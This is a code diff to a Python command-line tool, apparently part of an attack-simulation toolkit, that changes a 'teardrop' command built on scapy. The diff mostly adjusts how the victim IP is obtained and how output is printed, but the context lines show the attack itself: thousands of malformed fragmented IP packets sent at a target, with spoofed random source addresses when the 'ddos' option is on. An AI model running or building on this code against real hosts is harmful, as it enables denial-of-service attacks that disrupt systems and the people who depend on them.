@@ -1,13 +1,20 @@
 import click
+from cli.utils.common import get_victim_ip
 
 
 @click.command("teardrop", help="Teardrop attack")
-@click.option("--target", prompt="victim IP addr", help="victim to attack.")
+@click.option("--target", help="victim to attack.")
 @click.option("--ddos", default=True, help="enable ddos simulate")
 @click.option("--num", default=2000, help="number of packet, default = 2000")
 @click.option("--payload", default=36, help="size of payload")
-def teardrop(target, ddos, num, payload):
+@click.pass_context
+def teardrop(ctx, target, ddos, num, payload):
     from scapy.all import send, IP, RandIP
+
+    if target == "":
+        target = get_victim_ip()
+
+    click.echo("\n\n-------------------- teardrop attack ---------------------\n")
 
     src = RandIP() if ddos else RandIP()._fix()
     offset = 10
@@ -30,7 +37,7 @@ def teardrop(target, ddos, num, payload):
     send(j / load, verbose=False)
     sended += 1
 
-    print("Done!, Flushed %d packets" % (sended))
+    click.echo("Done!, Flushed %d packets" % (sended))
 
 
 if __name__ == "__main__":
